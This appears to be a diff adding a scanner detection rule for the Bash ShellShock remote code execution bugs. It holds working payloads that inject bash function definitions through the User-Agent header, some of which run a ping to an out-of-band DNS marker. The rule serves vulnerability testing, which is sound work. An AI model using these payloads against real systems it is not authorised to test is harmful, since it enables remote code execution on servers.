@@ -1,0 +1,38 @@
+#Attention! For this DSL detect you must use a custom test policy with HEADER_* insertion point!
+
+meta-info:
+  - title: "Bash remote code execution vulnerability (ShellShock, CVE-2014-6271, CVE-2014-6278, CVE-2014-7169)"
+  - type: "rce"
+  - threat: 100
+  - description: "This vulnerability allows remote attackers to execute arbitrary code via a crafted environment"
+  - tags:
+    - Bashdoor
+    - shellshock
+    - CVE 2014-6271
+    - CVE-2014-6278
+    - CVE-2014-7169
+
+collect:
+  - uniq:
+    - [URI]
+
+generate:
+  - into: HEADER_USER-AGENT
+  - method:
+    - replace
+  - payload:
+    #CVE 2014-6271
+    - "() { :; }; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH ;bash -c 'ping -c1 DNS_MARKER'"
+    - "() { :; }; echo; echo $((CALC_MARKER))"
+    #CVE-2014-6278
+    - "() { _; } >_[$($())] { echo; PATH=/usr/bin:/usr/local/bin:/bin; bash -c 'ping -c1 DNS_MARKER'; }"
+    - "() { _; } >_[$($())] { echo; echo $((CALC_MARKER)); }"
+    #CVE-2014-7169
+    - "() { (a)=>' echo -e \"Content-Type: text/plain\n\"; echo $((CALC_MARKER))"
+
+detect:
+  - oob:
+    - dns
+  - response:
+    - body: CALC_MARKER
+    - headers: CALC_MARKER
